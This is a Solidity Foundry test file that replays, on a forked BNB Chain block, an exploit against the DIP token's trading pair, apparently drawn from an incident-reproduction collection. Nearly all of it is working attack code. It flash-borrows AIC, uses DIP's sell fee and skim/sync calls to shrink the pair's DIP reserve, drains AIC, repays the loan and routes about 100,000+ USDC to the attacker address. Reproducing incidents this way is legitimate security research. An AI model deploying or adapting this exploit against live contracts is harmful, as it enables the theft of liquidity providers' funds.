// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 111,097.59 USDC
// Attacker : 0x0d4024cd27538350a911d9b7ee90811fa4875ba3
// Attack Contract : 0xddef10a85a5c67a9af8398d297aa51f8716383c7
// Vulnerable Contract : 0x6c60bf5db0670ae94489d3dde2c60f271625db50
// Victim : 0xf7d8267d01d1104da2dd30828aa9c0e1647919ef
// Attack Tx : https://bscscan.com/tx/0x1c09395848a87069c9d6ddbe5adc6249510aba7a2a83479a74b4280cafb5fb29

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x6c60bf5db0670ae94489d3dde2c60f271625db50#code
// Attack Contract Code: https://bscscan.com/address/0xddef10a85a5c67a9af8398d297aa51f8716383c7#code (open source)

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2067059314519417163
//
// The attacker flash-swapped AIC, used DIP's sell fee plus double router-transfer bug to shrink the DIP/AIC
// pair's DIP reserve with skim/sync, swapped the remaining DIP for nearly all pair AIC, repaid the flash swap,
// and swapped residual AIC into USDC for the transaction sender.

address constant ATTACKER = 0x0d4024Cd27538350a911D9B7eE90811fa4875ba3;
address constant AIC = 0x524c72268E2053bB356Ecb4C1364B5BB74644405;
address constant DIP = 0x6C60bf5DB0670ae94489d3DdE2c60f271625dB50;
address constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant AIC_NEX_PAIR = 0xF8331a897C5F32B57EAb394af8ADF0D00003CAE1;
address constant AIC_DIP_PAIR = 0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 104_598_278;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDC;

        vm.label(ATTACKER, "Attacker");
        vm.label(AIC, "AIC");
        vm.label(DIP, "DIP");
        vm.label(USDC, "USDC");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
        vm.label(AIC_NEX_PAIR, "AIC/NEX Pair");
        vm.label(AIC_DIP_PAIR, "AIC/DIP Pair");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        DipExploit exploit = new DipExploit(ATTACKER);
        vm.label(address(exploit), "Local Exploit Helper");

        uint256 usdcBefore = IERC20(USDC).balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        exploit.execute();

        uint256 usdcProfit = IERC20(USDC).balanceOf(ATTACKER) - usdcBefore;
        emit log_named_decimal_uint("USDC profit", usdcProfit, 18);
        assertGt(usdcProfit, 100_000 ether, "DIP exploit should leave USDC profit");
    }
}

contract DipExploit {
    uint256 private constant FLASH_AIC_AMOUNT = 19_000_000 ether;
    uint256 private constant PANCAKE_FEE_DENOMINATOR = 10_000;
    uint256 private constant PANCAKE_FEE_ADJUSTED = 9_975;
    uint256 private constant DIP_SELL_FEE = 6;
    uint256 private constant DIP_FEE_DENOMINATOR = 100;

    address private immutable profitReceiver;

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    function execute() external {
        // step 1: borrow AIC from the AIC/NEX Pancake pair.
        IPancakePair(AIC_NEX_PAIR).swap(FLASH_AIC_AMOUNT, 0, address(this), new bytes(1));

        // step 5: forward the remaining AIC profit through the AIC/USDC pair to the real tx sender.
        _swap(AIC, USDC, IERC20(AIC).balanceOf(address(this)), profitReceiver);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == AIC_NEX_PAIR, "unexpected callback pair");
        require(sender == address(this), "unexpected callback sender");
        require(amount0 == FLASH_AIC_AMOUNT && amount1 == 0, "unexpected flash amount");
        require(data.length != 0, "missing callback data");

        // step 2: convert borrowed AIC to DIP through the vulnerable DIP/AIC pair.
        _swap(AIC, DIP, IERC20(AIC).balanceOf(address(this)), address(this));

        // step 3: make the pair hold almost one extra reserve worth of DIP, then skim it to the router.
        uint256 dipPairBalance = IERC20(DIP).balanceOf(AIC_DIP_PAIR);
        // Keep the post-skim DIP reserve nonzero so the router can quote the next swap.
        uint256 dipNetToPair = dipPairBalance - 1;
        uint256 dipInput = (dipNetToPair * DIP_FEE_DENOMINATOR) / (DIP_FEE_DENOMINATOR - DIP_SELL_FEE);
        IERC20(DIP).transfer(AIC_DIP_PAIR, dipInput);
        IPancakePair(AIC_DIP_PAIR).skim(PANCAKE_ROUTER);
        IPancakePair(AIC_DIP_PAIR).sync();

        // step 4: swap remaining DIP into the distorted AIC reserve and repay the flash swap.
        _swap(DIP, AIC, IERC20(DIP).balanceOf(address(this)), address(this));
        uint256 flashRepayment = (amount0 * PANCAKE_FEE_DENOMINATOR) / PANCAKE_FEE_ADJUSTED + 1;
        IERC20(AIC).transfer(AIC_NEX_PAIR, flashRepayment);
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn, address receiver) private {
        IERC20(tokenIn).approve(PANCAKE_ROUTER, amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, receiver, block.timestamp
        );
    }
}
